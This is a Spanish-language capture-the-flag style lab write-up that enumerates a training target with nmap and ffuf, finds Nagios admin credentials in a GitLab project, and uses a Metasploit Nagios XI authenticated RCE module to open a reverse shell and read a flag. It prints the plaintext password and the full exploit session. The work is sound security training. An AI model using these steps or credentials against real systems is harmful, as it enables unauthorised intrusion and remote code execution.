
# Lab - Ataques a Aplicaciones II

## <mark style="color:purple;">**Skills Assestment II**</mark>

Durante una prueba de penetración externa para la empresa Inlanefreight, te encuentras con un servidor que, a primera vista, no parece muy interesante. En este punto de la evaluación, has agotado todas las opciones y te has topado con varios callejones sin salida. Al revisar tus notas de enumeración, algo te llama la atención sobre este servidor en particular. También ves una nota que no recuerdas sobre el vhost `gitlab.inlanefreight.local`.

Realizar una enumeración más profunda e iterativa revela varias fallas graves. Enumere el objetivo con cuidado y responda todas las preguntas a continuación para completar la segunda parte de la evaluación de habilidades.

```
Objetivo: 10.129.201.90

vHosts necesarios para estas preguntas:
gitlab.inlanefreight.local
```

***

## <mark style="color:purple;">Pregunta 1</mark>

> ¿Cuál es la URL de la instancia de WordPress?

### Escaneo de puertos

```bash
sudo nmap -v -sV -T5 10.129.201.90

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
389/tcp  open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp  open  ssl/http Apache httpd 2.4.41 ((Ubuntu))
8180/tcp open  http     nginx
Service Info: Host:  skills2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

El escaneo con Nmap nos devuelve varios puertos interesantes, en el que destacamos el puerto 80 con una instancia de Wordpress y el 8180 con una instancia de Gitlab.

### Fuzzing

Haciendo un fuzzing de vhosts encontramos la url relativa al wordpress y otros 2 vhosts:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.inlanefreight.local" -u http://10.129.201.90 -mc 200,301,302,403 -fs 46166

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.201.90
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.inlanefreight.local
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
 :: Filter           : Response size: 46166
________________________________________________

blog                    [Status: 200, Size: 50119, Words: 16140, Lines: 1015, Duration: 150ms]
monitoring              [Status: 302, Size: 27, Words: 5, Lines: 1, Duration: 131ms]
gitlab                  [Status: 301, Size: 339, Words: 20, Lines: 10, Duration: 100ms]
```

La URL de Wordpress es: `http://blog.inlanefreight.local`

## <mark style="color:purple;">Pregunta 2</mark>

> ¿Cuál es el nombre del proyecto público de GitLab?

Accedemos a la instancia de Gitlab por el puerto 8180:

<figure><img src="/files/8T4Hqr7I47e6gsQO65xq" alt=""><figcaption></figcaption></figure>

Vamos a la pestaña explore a ver si encontramos algún repositorio interesante. Encontramos un repositorio Virtualhost que nos llama la atención:

<figure><img src="/files/WFY7CJkL0U8sB0J0dsU0" alt=""><figcaption></figcaption></figure>

Y encontramos un FQDN relativo al tercer host:

<figure><img src="/files/0MdZHTmhKgZJpbQWuXuM" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Pregunta 3</mark>

> ¿Qué aplicación se está ejecutando en este tercer vhost? ¿Cuál es la contraseña de administrador para acceder a esta aplicación?

<figure><img src="/files/4PcIkkB4zFHBFIi7SPyh" alt=""><figcaption></figcaption></figure>

Al acceder a `monitoring.inlanefreight.local` llegamos a un login de Nagios.

Al crear una nueva cuenta de Gitlab, en `Explore Project` encontramos más proyectos, concretamente el que nos interesa es Nagios PostgreSQL:&#x20;

<figure><img src="/files/Rg3hoZ36heDtYtGde9kw" alt=""><figcaption></figcaption></figure>

Al enumerar este directorio nos encontramos las credenciales del administrador de Nagios:

<figure><img src="/files/fN1PC6FD7U0FADrBa85i" alt=""><figcaption></figcaption></figure>

#### Explotación

Ahora que sabemos las credenciales, vamos a usar un módulo de Metasploit:

```bash
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > setg rhosts 10.129.201.90
rhosts => 10.129.201.90
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > setg password oilaKglm7M09@CPL&^lC
password => oilaKglm7M09@CPL&^lC
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > setg vhost monitoring.inlanefreight.local
vhost => monitoring.inlanefreight.local
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > setg lhost tun0
lhost => tun0
msf6 exploit(linux/http/nagios_xi_configwizards_authenticated_rce) > run

[*] Started reverse SSL handler on 10.10.15.109:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting to authenticate to Nagios XI...
[+] Successfully authenticated to Nagios XI.
[*] Target is Nagios XI with version 5.7.5.
[+] The target appears to be vulnerable.
[*] Sending the payload...
[*] Command shell session 1 opened (10.10.15.109:4444 -> 10.129.201.90:34152) at 2025-02-12 19:35:54 +0000

whoami
www-data
```

Tenemos una shell limitada, no podemos navegar entre directorios. Vamos a ver el contenido del directorio admin para ver si está la flag:

```bash
ls -l /usr/local/nagiosxi/html/admin/

total 1236
-rwxr-xr-- 1 nagios nagios  94577 Sep  2  2021 activate.php
-rwxr-xr-- 1 nagios nagios  39654 Sep  2  2021 auditlog.php
-rwxr-xr-- 1 nagios nagios   5861 Sep  2  2021 autologin.php
-rwxr-xr-- 1 nagios nagios  30162 Sep  2  2021 components.php
-rwxr-xr-- 1 nagios nagios   5877 Sep  2  2021 configpermscheck.php
-rwxr-xr-- 1 nagios nagios  22253 Sep  2  2021 configwizards.php
-rwxr-xr-- 1 nagios nagios  18839 Sep  2  2021 coreconfigsnapshots.php
-rwxr-xr-- 1 nagios nagios  10718 Sep  2  2021 dashlets.php
-rwxr-xr-- 1 nagios nagios   1999 Sep  2  2021 datatransfer.php
-rw-r--r-- 1 nagios nagios 173573 Sep  2  2021 deadpool.php
-rwxr-xr-- 1 nagios nagios  14335 Sep  2  2021 dtinbound.php
-rwxr-xr-- 1 nagios nagios  21061 Sep  2  2021 dtoutbound.php
-rw-r--r-- 1 root   root       33 Sep  3  2021 f5088a862528cbb16b4e253f1809882c_flag.txt
```

Encontramos la flag! Vamos a leerla:

```
cat /usr/local/nagiosxi/html/admin/f5088a862528cbb16b4e253f1809882c_flag.txt
afe377683dce373*****************
```
